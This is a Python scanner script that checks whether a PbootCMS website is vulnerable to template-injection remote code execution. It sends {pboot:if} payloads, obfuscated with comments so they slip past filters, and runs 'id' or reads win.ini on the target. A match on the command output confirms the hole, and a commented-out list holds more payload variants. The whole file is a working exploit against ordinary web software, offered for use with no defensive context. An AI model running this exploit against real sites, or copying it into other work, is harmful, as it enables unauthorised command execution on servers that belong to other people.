import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	# payload=['index.php?keyword=}{pboot:if(get_lg/**/()/**/(get_backurl/*-*/()))}data{/pboot:if}&backurl=;','index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;','index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;','?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;']
	payload=['index.php?keyword=}{pboot:if(get_lg/*-*/()/*-*/(get_backurl/*-*/()))}data{/pboot:if}&backurl=;']
	cmd=['id','type%20C:\\Windows\\win.ini']
	
	total=[]
	for p in payload:
		for c in cmd:
			total.append((p,c))
	flag=[]
	for t in total:
		pl=t[0]
		cm=t[1]
		try:
			if baseurl[-1]=="/":
				baseurl=baseurl
			else:
				baseurl=baseurl+"/"
			url=baseurl+pl+cm
			headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",'Cookie': 'lg=system'}
			response=requests.get(url,headers=headers,timeout=5,verify=False)
			if ("uid=" in response.text and "gid=" in response.text) or 'for 16-bit app support' in response.text:
				flag.append(1)
				break
		except:
			pass
	if len(flag)>0:
		return True
	else:
		return False
